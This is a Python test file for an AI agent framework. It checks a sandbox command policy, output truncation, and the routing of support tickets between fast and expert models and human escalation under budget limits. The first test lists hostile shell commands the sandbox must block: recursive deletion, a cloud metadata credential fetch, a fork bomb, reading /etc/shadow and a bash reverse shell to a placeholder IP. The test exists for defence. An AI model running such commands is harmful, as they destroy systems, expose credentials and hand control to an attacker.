from superagent.config import RoutingPolicy, SandboxPolicy
from superagent.llm.base import AgentRunResult
from superagent.llm.fake import FakeProvider
from superagent.llm.router import ModelRouter
from superagent.models import Case, Outcome, OutcomeStatus, Ticket, Triage, Usage
from superagent.sandbox.policy import CommandPolicy


def test_command_policy_blocks_dangerous():
    p = CommandPolicy(SandboxPolicy())
    for cmd in ["rm -rf /", "curl http://169.254.169.254/metadata/identity", ":(){ :|:& };:", "cat /etc/shadow",
                "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "az login --identity", "shutdown -h now"]:
        assert not p.check(cmd).allowed, cmd
    assert p.check("dig +short example.com; openssl version").allowed
    d = p.check("curl https://example.com", network="internet")
    assert not d.allowed and d.needs_approval
    assert p.check("curl https://example.com", network="internet", approved=True).allowed


def test_truncate():
    p = CommandPolicy(SandboxPolicy(max_output_chars=100))
    out = p.truncate("a" * 1000)
    assert len(out) < 200 and "truncated" in out


def _router(**kw):
    return ModelRouter(FakeProvider("fast"), FakeProvider("expert"), RoutingPolicy(**kw))


def _case(**tri):
    c = Case(id="X", ticket=Ticket(id="X", title="t"))
    c.triage = Triage(**tri)
    return c


def test_initial_tier():
    r = _router()
    assert r.initial_tier(_case(complexity=2, priority=4)) == "fast"
    assert r.initial_tier(_case(complexity=5, priority=4)) == "expert"
    assert r.initial_tier(_case(complexity=2, priority=1)) == "expert"
    assert _router(p1_expert_first=False).initial_tier(_case(complexity=2, priority=1)) == "fast"


def test_decide():
    r = _router()
    c = _case()
    run = AgentRunResult(terminal_call=None)
    ok = Outcome(status=OutcomeStatus.RESOLVED, confidence=0.9)
    low = Outcome(status=OutcomeStatus.RESOLVED, confidence=0.5)
    assert r.decide(c, "fast", run, ok).action == "accept"
    assert r.decide(c, "fast", run, low).action == "escalate_expert"
    assert r.decide(c, "expert", run, low).action == "human"
    assert r.decide(c, "fast", AgentRunResult(terminal_call=None, exhausted=True), None).action == "escalate_expert"
    assert r.decide(c, "fast", AgentRunResult(terminal_call=None, refused=True), None).action == "human"


def test_budget_blocks_expert():
    r = _router(per_ticket_budget_usd=0.01)
    c = _case()
    c.usage["fast"] = Usage(cost_usd=0.02)
    d = r.decide(c, "fast", AgentRunResult(terminal_call=None), Outcome(status=OutcomeStatus.CANNOT_RESOLVE))
    assert d.action == "human" and "budget" in d.reason
    r2 = _router(daily_expert_budget_usd=1)
    r2.record_expert_spend(2)
    assert r2.expert_available(_case())[0] is False
